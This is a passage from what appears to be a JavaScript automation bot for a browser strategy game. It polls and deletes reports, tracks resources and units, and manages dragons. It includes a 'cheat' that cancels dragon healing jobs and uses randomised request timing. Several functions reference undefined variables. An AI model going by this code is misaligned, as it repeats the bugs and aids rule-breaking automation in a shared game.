			var reports_AttackMarch = $J.grep(reports_available, function(e){ return (e.warnings && e.warnings.march_type && e.warnings.march_type === 'AttackMarch') });
			if (reports_AttackMarch.length > 0) {
				attack_type.AttackMarch.number = reports_AttackMarch.length;
				reports_AttackMarch.sort( function(a,b){return a.arrives_at - b.arrives_at;} );
				attack_type.AttackMarch.time_left = reports_AttackMarch[0].arrives_at-now;
			}

			// Set alert level 
			if ( attack_type.Unknown.number > 0 || attack_type.AttackMarch.number > 0 ) {
				ret.alert_level=2;
			} else if ( attack_type.SpyMarch.number > 0 ) {
				ret.alert_level=1;
			} else {
				ret.alert_level=0;
			}
		}
		
		
		ret.march=attack_type.cloneProps();
		
		return ret;
	},

	deletetick : function () {
		var t = Sentinel;
		
		Data.options.sentinel.messages = $J.grep(Data.options.sentinel.messages, function(e){ 
			var now = serverTime();
			var time_left = now - e.arrives_at;
			if (time_left < (Data.options.sentinel.msg_keeping.delay * Data.options.sentinel.msg_keeping.unit)) {
				return true;
			} else {
				return false;
			}
		});
	},
	
}; // End Sentinel Object

// Messages manager
Messages = {
	read_list : {},

	DEFAULT_TIME_CHECKLIST : [30000,60000],
	ALERT_TIME_CHECKLIST : [5000,5000],
	DEFAULT_TIME_READREPORT : [3000,5000],
	DEFAULT_TIME_ALERTREPORT : [1000,2000],

	timers : {
		fetch_next : {},
		fetch_list : null,
		delete_list : null,
	},

	battle_report_listeners : [],
	delete_queue : [],

	init : function ()
	{
		var t = Messages;
		t.timers.fetch_list=setInterval(t.checkMessages,Math.randRange(5000,5000),{});
		t.timers.delete_list=setInterval(t.deleteMessageQueued,Math.randRange(t.DEFAULT_TIME_CHECKLIST[0],t.DEFAULT_TIME_CHECKLIST[1]));
		window.addEventListener ('unload', t.onUnload, false);
	},


	// Fixed by Lord Mimir
	deleteMessage : function ( msgId )
	{
		var t = Messages;
		
		t.delete_queue.push ( msgId );

	},		

	deleteMessageQueued : function ()
	{
		var t = Messages;

		var msg_delete =  []
		$J.merge(msg_delete,t.delete_queue);
			
		if (msg_delete.length == 0 ) {
			return;
		}
		
		//Variable time of delete report
		clearTimeout(Messages.timers.delete_list);
		Messages.timers.delete_list=setInterval(Messages.deleteMessageQueued,Math.randRange(t.DEFAULT_TIME_CHECKLIST[0],t.DEFAULT_TIME_CHECKLIST[1]));
		
		
		MyAjax.reportsDelete ({
			ids       : msg_delete,
			onSuccess : function ( r ) {
				var t = Messages;
				for (var i=0;(i<t.delete_queue.length) && (t.delete_queue.length >0);)
				{
					var j = msg_delete.indexOf( t.delete_queue[i] );
					if (j >= 0) {
						t.delete_queue.splice(i,1);
					} else {
						i++;
					}
				}
			},
			onFailure : function ( r ){
				var ERROR_DELAY = DEFAULT_TIME_CHECKLIST[0];
				if ( r.status === 509 )
				{
					ERROR_DELAY = ERROR_509_DELAY;
				}
				if ( r.status === 429 )
				{
					ERROR_DELAY = ERROR_429_DELAY;
				}
				clearTimeout(Messages.timers.delete_list);
				Messages.timers.delete_list=setInterval(Messages.deleteMessageQueued,ERROR_DELAY);
			},
			caller    : 'Messages.deleteMessage'
		});
	},

	onUnload : function ()
	{
		var t = Messages;
		if (t.delete_queue.length > 0) {
			MyAjax.reportsDelete ({
				ids : t.delete_queue,
				onSuccess : function (){},
				onFailure : function (){},
				caller    : 'Messages.onUnload'
			});
		}
	},

	// Check for battle reports
	/*
		options
		{
			category:
			wait:
		}
	*/
	checkMessages : function ( options )
	{
		var t = Messages;
		
		var category = ( options.category || 'all' ).toLowerCase(); // based on Didi idea (thanks)

		//Variable Time and adjust with sentinel alert_level
		clearTimeout(Messages.timers.fetch_list);
		var TIME = t.DEFAULT_TIME_CHECKLIST
		if (Sentinel.alert_level == 0 || !Data.options.sentinel.enabled) {
			TIME = t.DEFAULT_TIME_CHECKLIST;
		} else {
			TIME = t.ALERT_TIME_CHECKLIST;
		}
		Messages.timers.fetch_list=setInterval(Messages.checkMessages,Math.randRange(TIME[0],TIME[1]),{});
		
		

		MyAjax.reports ({
			category  : category,
			onSuccess : function ( r ){
				var t = Messages;
				var totmsg = 0;
				
				for ( var i = r.length-1; i >= 0; i-- )
				{
					if ( !r[i].read_at ) //r[i].report_type === 'BattleReport' &&
					{
						var type = r[i].report_type;
						var myfunc = 'got'+type;
						if ( typeof t[myfunc] !== 'function' ) { 
							continue;
						}

						if (!t.read_list[type] && typeof t[myfunc] === 'function') {
							t.read_list[type]= [];
						}
						if ( typeof t[myfunc] === 'function') {
							var result = $J.grep(t.read_list[type], function(e){ return e.id == r[i].id; });
							if ( result.length == 0 ){
								t.read_list[type].push( {id : r[i].id , type : r[i].report_type });
							}
						}
					}
				}
				
				for ( var type in t.read_list ) {
					if (!t.timers.fetch_next[type] && t.read_list[type].length > 0 ) {
						t.timers.fetch_next[type] = null;
						var TIME_READ = t.DEFAULT_TIME_READREPORT;
						if (/SentinelWarning/.test(type) && Data.options.sentinel.enabled) TIME_READ = t.DEFAULT_TIME_ALERTREPORT;
						t.timers.fetch_next[type] = setInterval ( t.fetchNext, Math.randRange(TIME_READ[0],TIME_READ[1]), type );
					}
				}
			},
			
			onFailure : function ( r ) {
				var t = Messages;
				var ERROR_DELAY = t.DEFAULT_TIME_CHECKLIST[0];
				if ( r.status === 509 )
				{
					ERROR_DELAY = ERROR_509_DELAY;
				}
				if ( r.status === 429 )
				{
					ERROR_DELAY = ERROR_429_DELAY;
				}
				clearTimeout(Messages.timers.fetch_list);
				t.timers.fetch_list=setInterval(t.checkMessages,ERROR_DELAY,{});
			},

			caller    : 'Messages.checkMessages'
		});
	},  

	fetchNext : function (type)
	{
		var t = Messages;

		if (t.read_list[type].length == 0 ) { 
			return;
		}

		//Variable time read reports
		var TIME_READ = t.DEFAULT_TIME_READREPORT;
		if (/SentinelWarning/.test(type) && Data.options.sentinel.enabled) TIME_READ = t.DEFAULT_TIME_ALERTREPORT;
		clearTimeout ( t.timers.fetch_next[type] ); t.timers.fetch_next[type]=null;
		t.timers.fetch_next[type] = setInterval ( t.fetchNext, Math.randRange(TIME_READ[0],TIME_READ[1]), type );

		var msg = t.read_list[type].shift();
		if ( !msg.id ){
			debugLog ('t.read_list BAD MESSAGE ID:\n'+ inspect (msg, 8, 1));
			return;
		}

		var myfunc = 'got'+type;
		if ( typeof t[myfunc] !== 'function') { 
			logit ('Error : '+myfunc+' not exists');
			return;
		}
		
		if ( type == 'BattleReport' && t.battle_report_listeners.length === 0 ){
			return;
		}
		
		MyAjax.reportsRead ({
			report_id : msg.id,
			onSuccess : function ( r ){
				var t = Messages;
				var myfunc = 'got'+type;
				if ( typeof t[myfunc] == 'function') { 
					t[myfunc](r);
				}
			},
			onFailure  : function (r) {
				var t = Messages;
				t.read_list[type].push(msg);
				var ERROR_DELAY = TIME_READ[1];
				if ( r.status === 509 )
				{
					ERROR_DELAY = ERROR_509_DELAY;
				}
				if ( r.status === 429 )
				{
					ERROR_DELAY = ERROR_429_DELAY;
				}
				clearTimeout(t.timers.fetch_next[type]);
				t.timers.fetch_next[type] = setInterval ( t.fetchNext, ERROR_DELAY ,type );
			},
			caller     : 'Messages.fetchNext'
		});
	},

	gotBattleReport : function ( r )
	{
		var t = Messages;
		
		if ( !r.report ) return;
		
		if ( DEBUG_MARCHES ){
			debugLog ('Read Message: '+ r.report.location.terrain +' , '+ r.report.location.x +','+  r.report.location.y );    
		}
		//logit('battle report =\n'+inspect(r.report,8,1));
		for ( var i=0; i < t.battle_report_listeners.length; i++ ){
			t.battle_report_listeners[i]( r );
		}
	},

	gotTradingReport : function ( r )
	{
		var t = Messages;
		
		if ( !r.report ) return;
		
		if ( r.report.trading_report && r.report.trading_report.player_id && r.report.trading_report.player_id == Seed.player.id ) {
			var details = r.report.trading_report.details;
			if ( details ) {
				// Sale 
				if (details.type === 'sale') { 
					var resources = {};
					if (details.offer && details.offer.price) {
						resources['gold']=details.offer.price;
					}
					Resources.add(resources);
				} else if (details.type === 'delivery') { //Buy
					var resources = {};
					if (details.offer && details.offer.product && details.offer.units) {
						resources[details.offer.product]=details.offer.units;
					}
					Resources.add(resources);
				}
			}
		}
		
		if ( Data.options.delete_reports.trading ) {
			t.deleteMessage(r.report_notification.id);
		}

	},

	gotTransportMarchReport : function ( r )
	{
		var t = Messages;
		
		if ( !r.report ) return;
		
		if ( r.report.recipient && r.report.recipient.player_id && r.report.recipient.player_id == Seed.player.id ) {
			if (r.report.spoils ) {
				var resources = r.report.spoils;
				Resources.add(resources);
			}
		}
		if ( Data.options.delete_reports.transport ) {
			t.deleteMessage(r.report_notification.id);
		}
	},

	gotSentinelWarning : function ( r )
	{
		var t = Messages;
		var report = r.report.cloneProps();
		//logit('report sentinelle =\n'+inspect(report,8,1));
		if (report.warnings) delete report.warnings.version;
		// Didi : add sentinel level
		var sentinel_level = Buildings.getLevel( 0 ,'Sentinel').min;
		report.sentinel_level = sentinel_level;
		//Ajust arrives_at time with march_arrival_time if exists
		if (report.warnings && report.warnings.march_arrival_time ) {
			report.arrives_at = parseInt(new Date(report.warnings.march_arrival_time.replace(/-/g,'/')).getTime() / 1000);
		}
		Data.options.sentinel.messages.push(report);
	},
	
	addBattleReportListener : function ( notify )
	{
		var t = Messages;
		t.battle_report_listeners.push( notify );
	},

	removeBattleReportListener : function ( notify )
	{
		var t = Messages;
		var i = t.battle_report_listeners.indexOf( notify );
		if ( i >= 0 ){
			t.battle_report_listeners.splice( i, 1 );
		}
	}

}; // END Messages


//Resources Manager
Resources = {

	timer          : null,
	
	resources_type : [ 'gold', 'food', 'wood', 'ore', 'stone','blue_energy' ],
  transportable_resource_types	: [	'gold', 'food', 'wood', 'ore', 'stone'],
	
	rates          : { },
	
	last_refresh   : 0,
	
	updating      : false,
	
	init : function ( )
	{
		var t = Resources;
		
		t.rates = Seed.cities[ 0 ].figures.resource_rates;
	
		t.start ( );
	},
	
	start : function ( )
	{
		var t = Resources;
		t.timer = setInterval ( t.tick, 1000 );
	},
	
	stop : function ( )
	{
		var t = Resources;
		clearInterval ( t.timer ); t.timer=null;
	},
	
	onUpdateCity : function ( )
	{
		var t = Resources;
		t.rates = Seed.cities[ 0 ].figures.resource_rates; //Didi : update rates too
		t.last_refresh = serverTime ( );
	},
	
	// this is used when performing an action involving a resource update
	// the resources argument is an object with every resource and what is added
	// ex: { gold: 50, food: 300, wood: 130, ore: 100, stone: 300, blue_energy: 0 }
	set : function ( resources )
	{
		var t = Resources;
		
		t.updating = true;
		
		for ( var type in resources )
		{
			Seed.cities[ 0 ].resources[ type ] = resources[ type ];
		}
		
		t.updating = false;
		
	},
	
	// this is used when performing an action involving a resource added
	// the resources argument is an object with every resource and what is added
	// ex: { gold: 50, food: 300, wood: 130, ore: 100, stone: 300, blue_energy: 0 }
	add : function ( resources )
	{
		var t = Resources;
		
		for ( var type in resources )
		{
			Seed.cities[ 0 ].resources[ type ] += resources[ type ];
		}
		
	},
	
	// this is used when performing an action involving a resource consumption
	// the resources argument is an object with every resource and what is consumed
	// ex: { gold: 50, food: 300, wood: 130, ore: 100, stone: 300, blue_energy: 0 }
	remove : function ( resources )
	{
		var t = Resources;
		
		for ( var type in resources )
		{
			var production = t.rates[ type ];
			//if ( production ) {
			//	var min_capacity = (production.vault_capacity || 0);
			//} else {
			var min_capacity = 0;
			//}
			var value = Seed.cities[ 0 ].resources[ type ];
			value -= resources[ type ];
			Seed.cities[ 0 ].resources[ type ] = (value > min_capacity ? value : min_capacity);
		}
	},
	
	tick : function ( options )
	{
		var t = Resources;
		
		if ( t.updating ) return;
		
		var now = serverTime ( );
		
		var StorageVault_level = Buildings.getLevel( 0 ,'StorageVault').min;
		

		for ( var idx = 0; idx < t.resources_type.length; idx++ )
		{
			var type = t.resources_type[ idx ];
			
			var production = t.rates[ type ];
		
			// if we don't have blue_energy yet
			if ( !production || !production.rate ) continue;
			
			var value = Seed.cities[ 0 ].resources[ type ];
      var min_capacity = (production.vault_capacity || 0);
      var max_capacity = production.capacity;
			
			var active_min_stock = (StorageVault_level >= 10 && min_capacity > 0);
			
      var ratePerSecond = (!active_min_stock || value >= min_capacity ? production.rate : (production.gross_rate||0)) / 3600;
      
			if ( t.last_refresh )
			{
				// Case when a delay is to take into account when city data has just been updated
				ratePerSecond *= ( now - t.last_refresh );
				t.last_refresh = 0;
			}
      
			var new_value = value + ratePerSecond;
			
      if (ratePerSecond < 0)
      { 
      	if (!active_min_stock || new_value > min_capacity) {
					Seed.cities[ 0 ].resources[ type ] = (new_value > 0 ? parseInt(new_value) : 0);
      	} else {
					Seed.cities[ 0 ].resources[ type ] = min_capacity;
      	}
        continue;
			}
      if (ratePerSecond > 0)
      {
      	if (value > max_capacity) {
      		continue;
      	}
      	if (new_value > max_capacity) {
	        Seed.cities[ 0 ].resources[ type ] = max_capacity;
      		continue;
      	}
        Seed.cities[ 0 ].resources[ type ] = (!active_min_stock || new_value < max_capacity ? parseInt(new_value) : max_capacity);
      }
		}
	},

};// END Resourses

//Units Manager
Units = {
	
	all_units_type	: [	'Porter',
											'Conscript',
											'Spy',
											'Halberdsman',
											'Minotaur',
											'Longbowman',
											'SwiftStrikeDragon',
											'BattleDragon',
											'ArmoredTransport',
											'Giant',
											'FireMirror',
											'PackDragon',
											'DarkSlayer', 
											'LightningCannon',
											'ChargeTroop',
											'VengeWyrm',
											'AquaTroop',
											'StoneTroop',
											'FireTroop',
											'WindTroop',
											'IceTroop', 
											'FrostGiant', 
											'SwampTroop', 
											'ForestTroop', 
											'DesertTroop',
											'DimensionalRuiner',
											'ArcticLeviathan'],
	
	transport_unit_types : [	'Porter', 
														'ArmoredTransport', 
														'PackDragon' ],

	waves_units_type		: [	'ArmoredTransport',
													'PackDragon',
													'Conscript',
													'Spy',
													'Halberdsman',
													'Minotaur',
													'Longbowman',
													'SwiftStrikeDragon',
													'BattleDragon',
													'Giant',
													'FireMirror',
													'DarkSlayer',
													'LightningCannon', 
													'ChargeTroop',
													'VengeWyrm',
													'AquaTroop',
													'StoneTroop',
													'FireTroop',
													'WindTroop',
													'IceTroop', 
													'FrostGiant', 
													'SwampTroop', 
													'ForestTroop', 
													'DesertTroop',
													'DimensionalRuiner',
													'ArcticLeviathan'],

	attacks_units_type 		: [	'Porter', 
														'Conscript', 
														'Spy', 
														'Halberdsman', 
														'Minotaur', 
														'Longbowman', 
														'SwiftStrikeDragon', 
														'BattleDragon', 
														'ArmoredTransport', 
														'PackDragon', 
														'Giant', 
														'FireMirror', 
														'DarkSlayer', 
														'LightningCannon', 
														'ChargeTroop', 
														'VengeWyrm',
														'AquaTroop', 
														'StoneTroop', 
														'FireTroop', 
														'WindTroop',
														'IceTroop',
														'FrostGiant',
														'SwampTroop',
														'ForestTroop',
														'DesertTroop',
														'DimensionalRuiner',
														'ArcticLeviathan'],
														
	resurrect_units_type : [	'Porter',
														'Conscript',
														'Spy',
														'Halberdsman',
														'Minotaur',
														'Longbowman',
														'SwiftStrikeDragon',
														'BattleDragon',
														'ArmoredTransport',
														'Giant',
														'FireMirror',
														//'DarkSlayer',
														//'LightningCannon', 
														'ChargeTroop',
														'VengeWyrm', 
														//'DimensionalRuiner',
														//'ArcticLeviathan',
														'PackDragon',
														'AquaTroop',
														'StoneTroop',
														'FireTroop',
														'WindTroop',
														'IceTroop',
														'FrostGiant',
														'SwampTroop',
														'ForestTroop',
														'DesertTroop'],

	// Didi : return the trainable status of unit for the city
	isTrainable : function ( unit_type, city_idx )
	{
		var city_type = CITY_TYPE[ city_idx ];
		if ( city_type && city_type != '' ) {
			if ( Seed.stats.unit[unit_type] && Seed.stats.unit[unit_type].trainable && typeof (Seed.stats.unit[unit_type].trainable[city_type]) != 'undefined' ) {
				return Seed.stats.unit[unit_type].trainable[city_type];
			} else {
				return false;
			}
		} else {
			return false;
		}
	},
	
	// Didi
	// Return the trainable Units for the city
	getCityUnits : function ( city_idx )
	{
		var t = Units;
		var ret = [];
		for (var i=0; i < Units.all_units_type.length; i++) {
			var unit_type = Units.all_units_type[i];
			if (t.isTrainable( unit_type, city_idx ) ) {
				ret.push(unit_type);
			}
		}
		return ret;		
	},
	
	getUnitNumbers : function  ( city_idx, unit_type ) 
	{
		var city = ( typeof city_idx === 'number' ) ? Seed.cities[city_idx] : city_idx;
		var incity = city.units[unit_type] ? city.units[unit_type] : 0;
		var indefense = (city.defense_force ? ( city.defense_force[unit_type] ? city.defense_force[unit_type] : 0) : 0);
		var marches = 0;
		var intraining = 0;
		var inresurrection = 0;
		var souls_stock = 0;
		
		for ( var id in Seed.marches )
		{
			for ( var name in Seed.marches[id].units )
			{
				if ( unit_type === name ) {
					marches += Seed.marches[id].units[name];
				}
			}
		}

		// Find units in training jobs
		for (var city_i=0; city_i < Seed.cities.length; city_i++) {
			var jobs = getJobs( 'units', city_i );
			for ( var i = 0; i < jobs.length; i++ )
			{
				if ( unit_type === jobs[i].unit_type ){
					intraining += jobs[i].quantity;
				}
			}
		}

		var souls = Seed.cities[0].souls
		if (souls && souls [ unit_type ]) {
			souls_stock += souls [ unit_type ];
		}
			
		// Find units in resurrection jobs
		for (var city_i=0; city_i < Seed.cities.length; city_i++) {
			var jobs = getJobs( 'resurrection', city_i );
			for ( var i = 0; i < jobs.length; i++ )
			{
				if ( unit_type === jobs[i].unit_type ){
					inresurrection += jobs[i].quantity;
				}
			}
		}

		return { 	incity: incity, 
							indefense : indefense, 
							marches: marches, 
							intraining: intraining, 
							inresurrection: inresurrection,
							souls : souls_stock, 
							total: incity+indefense+marches };
	},

	checkAvailableUnits : function  ( city_idx, units )
	{
		if (!units) units={};
		var total = 0;
		for ( var unit_type in units )
		{
			if( Dragons.DRAGONS_REGEXP.test( unit_type ) ) {
				total +=1;
				continue;
			}
			if ( units[unit_type] > 0 )
			{
				total += units[unit_type];
				if ( Units.getUnitNumbers( city_idx, unit_type).incity < units[unit_type] )
				{
					return translate('Not enough') +' '+ translate(unit_type);
				}
			}
		}
		if ( total <= 0 ){
			return translate('No Troops Defined');
		}
		return null;
	},

	add : function ( unit_type , quantity ) 
	{
		Seed.cities[0].units[ unit_type ] += quantity;
	},
	
	remove : function ( unit_type , quantity )
	{
		Seed.cities[0].units[ unit_type ] -= quantity;
		if (Seed.cities[0].units[unit_type] < 0) {
			Seed.cities[0].units[unit_type] = 0;
		}
	}
													
}; // END UNITS

//Dragons Manager
Dragons = {
	DRAGON_OBJ_ID : [],
	
	DRAGONS_NAMES  : [],
	DRAGONS_REGEXP : null,
	
	all_dragons : {},
	
	timer : null,
	
	initName : function() {
		var t = Dragons;
		for (var i=0; i < CITY_DESC.length; i++)
		{
			var city = CITY_DESC[i];
			if (!city || $J.isEmptyObject(city)) continue;
			//console.log(inspect(city,8,1));
			t.DRAGON_OBJ_ID[i]=city.dragon_id;
			t.DRAGONS_NAMES[i] = city.dragon_name;
			t.all_dragons[city.dragon_name] = {};
			OUTPOST_TYPE_INDEX[ city.outpost_type ] = i;
			CITY_TYPE[i] = city.type;
		}
		
		t.DRAGONS_REGEXP = new RegExp('(' + t.DRAGONS_NAMES.join('|').replace(/\|+/g,'|') + ')');
	},
	
	init : function() {
		//Remove no init dragons
		var t = Dragons;
		for (var dragon_name in t.all_dragons) {
			if ($J.isEmptyObject(t.all_dragons[dragon_name])) {
				delete t.all_dragons[dragon_name];
			} else {
				if (Data.options.cheat.dragon_healing && typeof Data.options.cheat.heal_dragon[dragon_name] == 'undefined') {
					Data.options.cheat.heal_dragon[dragon_name] = false;
				}
			}
		}
		t.timer=setInterval(t.CheckDragonStatus,1000);
	},
	
	//check and update status of dragon
	CheckDragonStatus : function() {
		var t = Dragons;
		for (var dragon_name in t.all_dragons) {
			var dragon = t.all_dragons[dragon_name];
			if (!dragon) continue;
			
			//update status if items of Resources need
			if ( dragon.reqs && (dragon.reqs.items || dragon.reqs.resources)) {
				dragon.reqs = {};
				var reqs = Tabs.Jobs.checkRequirements ({
									reqs_type     : 'dragon', 
									city_idx      : dragon.index, //OUTPOST_TYPE_INDEX[name + 'Outpost'], 
									dragon_name     : t.DRAGON_OBJ_ID[ dragon.index ].toLowerCase(), 
									unit_quantity : 1
				});
				if ( reqs.msg ) {
					dragon.reqs = reqs.cloneProps();
					if (dragon_name == 'SpectralDragon') {
						dragon.armors     = 0;
					}
				} else {
					if (dragon_name == 'SpectralDragon') {
						dragon.armors     = 4;
					}
				}
			}
			
			//update check life versus dragon job
			if (dragon.life != dragon.maximum_life) {
				var jobs = getJobs ('dragon', dragon.index);
				if ( jobs.length === 0 )
				{
					t.Healing(dragon.index);
				}
			}
			
			//cheat heal dragon 
			if (Data.options.cheat.dragon_healing && Data.options.cheat.heal_dragon[dragon_name]) {
				if (dragon_name !== 'SpectralDragon' && dragon.life < dragon.life_required_to_march) {
					t.Cure(dragon.index);
				}
			}
		}
	},
	
	InMarch : function (dragon_name,march) {
		var t = Dragons;
		var dragon = t.all_dragons[ dragon_name ];
		if (!dragon) return;

		dragon.is_in_city = false;
		dragon.x = march.x;
		dragon.y = march.y;
		dragon.status = march.status;
	},

	returnInCity : function (dragon_name) {
		var t = Dragons;
		var dragon = t.all_dragons[ dragon_name ];
		if (!dragon) return;

		dragon.is_in_city = true;
		dragon.x = null;
		dragon.y = null;
		dragon.status = null;
				
		if ( !Seed.cities[ dragon.index ] ) {
			logit('pas city pour '+dragon_name+'/index='+t.dragon.index);
		} else {
			Seed.fetchCity ({
				city_id   : Seed.cities[ dragon.index ].id,
				onSuccess : function(){},
				onFailure : function(){},
				caller    : 'Dragons.returnInCity'
			});
		}
	},

	Healing : function ( city_idx ) {
		var t = Dragons;
		var now = serverTime(); 

		var dragon_name = t.DRAGONS_NAMES[ city_idx ];
		var dragon = t.all_dragons[ dragon_name ];
		
		if (!dragon) return;

		dragon.life = dragon.maximum_life;
		dragon.heal_at = now;
	},
	
	Cure : function ( city_idx ) {
		var t = Dragons;
		var now = serverTime(); 

		var dragon_name = t.DRAGONS_NAMES[ city_idx ];
		var dragon = t.all_dragons[ dragon_name ];
		
		if (!dragon) return;

		var jobs = getJobs ('dragon', dragon.index);
		if ( jobs.length === 0 )
		{
			return;
		}
		var job = jobs[0];

		MyAjax.cancel_jobs({
			city_id   : job.city_id,
			job_id   	: job.id,
			
			onSuccess : function ( r ) {
			},
			
			onFailure : function ( r ) {
			},
			caller    : 'Dragons.Cure'
		});
	},

	Wounded : function (city_idx,heal_at) {
		var t = Dragons;
		var now = serverTime(); 

		var dragon_name = t.DRAGONS_NAMES[ city_idx ];
		var dragon = t.all_dragons[ dragon_name ];
		
		if (!dragon) return;

		dragon.heal_at = heal_at;
								
		var time_left = dragon.heal_at - now;
		if ( time_left < 0 )
		{
			time_left = 0;
		} 
		else if ( isNaN( time_left ) ){
			time_left = 0;
		}
								
		var new_life = parseInt(dragon.maximum_life - dragon.recovery_rate * (time_left / 3600));
		if ( new_life > dragon.maximum_life ) {
			new_life = dragon.maximum_life;
		}
		dragon.life = new_life;
								
	},

	updateDragon : function ( dragon_name, city )
	{
		var t = Dragons;
		var now = serverTime(); 

		var dragon = t.all_dragons[ dragon_name ];
		if (!dragon || !city) return;
		
		var city_id = city.id;
		var city_idx = Seed.city_idx[city_id];
		
		var dragon_city = city[t.DRAGON_OBJ_ID[city_idx].toLowerCase()];
		if (!dragon_city) return;

		dragon.mergeWith(dragon_city);
		
		var aerial_combat_level = (Seed.player.research['AerialCombat']) ? Seed.player.research['AerialCombat'] : 0; 
		
		dragon.index      = city_idx
		dragon.name       = dragon_name;
		dragon.city_id    = city_id;
		
		dragon.reqs = {};
		if (!dragon.heal_at) {
			dragon.heal_at = now;
		} else if (dragon.heal_at < now) {
			dragon.heal_at = now;
			dragon.life = dragon.maximum_life
		}
		//dragon.deployLife = parseInt (dragon.maximum_life * (1 - 0.05 * aerial_combat_level));
		if (dragon_name != 'SpectralDragon') {
			dragon.summoned = true;

			dragon.armors     = t.checkDragonArmors( dragon_name );
			dragon.can_attack = ( dragon.level >= 8 && dragon.armors === 4 && aerial_combat_level > 0 );
		
			//if ( dragon.can_attack && dragon.life !== dragon.maximum_life ) 
			//{
			//		dragon.heal_at += parseInt(( ( dragon.maximum_life - dragon.life ) / dragon.recovery_rate) * 3600);
			//}
		
			if ( !dragon.can_attack ) {

				var reqs = Tabs.Jobs.checkRequirements ({
									reqs_type     : 'dragon', 
									city_idx      : city_idx, //OUTPOST_TYPE_INDEX[name + 'Outpost'], 
									dragon_name     : t.DRAGON_OBJ_ID[ dragon.index ].toLowerCase(), 
									unit_quantity : 1
				});
				if ( reqs.msg ) {
					dragon.reqs = reqs.cloneProps();
				}
			}
		} else {
			dragon.can_attack = dragon.summoned;

			var reqs = Tabs.Jobs.checkRequirements ({
								reqs_type     : 'dragon', 
								city_idx      : city_idx, //OUTPOST_TYPE_INDEX[name + 'Outpost'], 
								dragon_name     : t.DRAGON_OBJ_ID[ dragon.index ].toLowerCase(), 
								unit_quantity : 1
			});
			if ( reqs.msg ) {
				dragon.reqs = reqs.cloneProps();
				dragon.armors     = 0;
			} else {
				dragon.armors     = 4;
			}
			
		}
				
		// Fix dragon status 

		if (!dragon_city.is_in_city && dragon.status == null ) {
			dragon.is_in_city = dragon_city.is_in_city = true;
		}
		if (dragon_city.is_in_city && dragon.status != null ) {
			dragon.is_in_city = dragon_city.is_in_city = false;
		}

	},
	
	addLevel : function (dragon_name)
	{
		var t = Dragons;
		var dragon = t.all_dragons[ dragon_name ];
		if (!dragon) return;
		
		dragon.level += 1;
		if (dragon_name != 'SpectralDragon') {
			dragon.can_attack = ( dragon.level >= 8 && dragon.armors === 4 && aerial_combat_level > 0 );
		
			//if ( dragon.can_attack && dragon.life !== dragon.maximum_life ) 
			//{
			//		dragon.heal_at += parseInt(( ( dragon.maximum_life - dragon.life ) / dragon.recovery_rate) * 3600);
			//}
		
			if ( !dragon.can_attack ) {
				var reqs = Tabs.Jobs.checkRequirements ({
									reqs_type     : 'dragon', 
									city_idx      : OUTPOST_TYPE_INDEX[dragon_name + 'Outpost'], 
									dragon_name     : t.DRAGON_OBJ_ID[ dragon.index ].toLowerCase(), 
									unit_quantity : 1
				});
				if ( reqs.msg ) {
					dragon.reqs = reqs.cloneProps();
				}
			}
		} else {
			dragon.can_attack = dragon.summoned;
			var reqs = Tabs.Jobs.checkRequirements ({
								reqs_type     : 'dragon', 
								city_idx      : OUTPOST_TYPE_INDEX[dragon_name + 'Outpost'], 
								dragon_name     : t.DRAGON_OBJ_ID[ dragon.index ].toLowerCase(), 
								unit_quantity : 1
			});
			if ( reqs.msg ) {
				dragon.reqs = reqs.cloneProps();
				dragon.armors     = 0;
			} else {
				dragon.armors     = 4;
			}
			
		}
		
	},

	// Function to count number of piece armor (by Didi)
	checkDragonArmors : function ( dragon_type )
	{
		var t = Dragons;
		var armors = ['BodyArmor','ClawGuards','TailGuard','Helmet'];
		var total = 0;
		
		for ( var i = 0; i < armors.length; i++ )
		{
			if ( Items.getItem( dragon_type + armors[i] ) !== 0 ) {
				total++;
			}
		}
		return total;
	},

	getAvailableDragon : function (level) {
		var t = Dragons;
		var dragon;
		var found = 0;
		var need = 0;
		var units = Data.options.attacks.units[level];
		for ( var dragon_type in t.all_dragons )
		{
			if (units [dragon_type] > 0 )
			{
				need++;
				dragon = t.all_dragons[dragon_type];
				if ( dragon.can_attack && 
					 dragon.is_in_city &&
					(dragon.life >= dragon.life_required_to_march )
			   	){
					found++;
					break;
				}
			}
		}
  	
		if (need === 0)
			return '-1';
		else
		{
			if ( found > 0 )
				return dragon.name;
			else
				return null;
		}
	},

		// Verify if a dragon is available (by Didi)
	chooseOneDragon : function(units) {
		var t = Dragons;
		var dragon_selected = false;
		var dragon_added = false;
		for( var unit_type in units )
		{
			if( t.DRAGONS_REGEXP.test( unit_type ) && units[unit_type] > 0)
			{
				dragon_selected = true;
				var dragon = t.all_dragons[unit_type];
				if ( dragon_added       ||
					 !dragon.is_in_city || 
					 !dragon.can_attack || 
					 (dragon.life < dragon.life_required_to_march )
					) {
					units[unit_type] = 0;
				} else {
					dragon_added = true;
				}
			}
		}
		return (!dragon_selected || dragon_added);
	},
				
}; // END DRAGONS

// Items manager
Items = {
	
	all_items : {},
	
	category_items : [//'resource',
										'speedup',
										//'production',
										'general',
										'chest',
										'arsenal'],
	
	//arsenal_items : [ 'AquaTroopRespirator', 
	//									'StoneTroopItem', 
	//									'FireTroopItem', 
	//									'WindTroopItem', 
	//									'IceTroopItem', 
	//									'SwampTroopItem', 
	//									'FrostGiantItem', 
	//									'ForestTroopItem', 
	//									'DarkSlayerItem', 
	//									'AnthropusTalisman' ],

	// Returns the quantity of the specified item type or zero if the item type is not found
	getItem : function ( type ) 
	{
		var t = Seed;
		return Seed.player.items[type] || 0;
	},

	// this is used when performing an action involving a item update
	// the items argument is an object with every item and what is added
	// ex: { AntropusTalisman : 100, AquatroopRespirators : 100 }
	set : function ( items )
	{
		var t = Items;
		
		for ( var type in items )
		{
			Seed.player.items[ type ] = items[ type ];
		}
			
	},
	
	// this is used when performing an action involving a item added
	// the items argument is an object with every item and what is added
	// ex: { AntropusTalisman : 100, AquatroopRespirators : 100 }
	add : function ( items )
	{
		var t = Items;
		
		for ( var type in items )
		{
			if (!Seed.player.items[ type ]) {
				Seed.player.items[ type ] = 0;								
			}
			Seed.player.items[ type ] += items[ type ];
		}
	},
	
	// this is used when performing an action involving a items consumtion
	// the items argument is an object with every item and what is added
	// ex: { AntropusTalisman : 100, AquatroopRespirators : 100 }
	remove : function ( items )
	{
		var t = Items;
		
		for ( var type in items )
		{
			if (!Seed.player.items[ type ]) {
				Seed.player.items[ type ] = 0;								
			}
			Seed.player.items[ type ] -= items[ type ];
			if (Seed.player.items[ type ] < 0) {
				Seed.player.items[ type ] = 0;								
			}
		}
	},
	
}; // END Items
/*
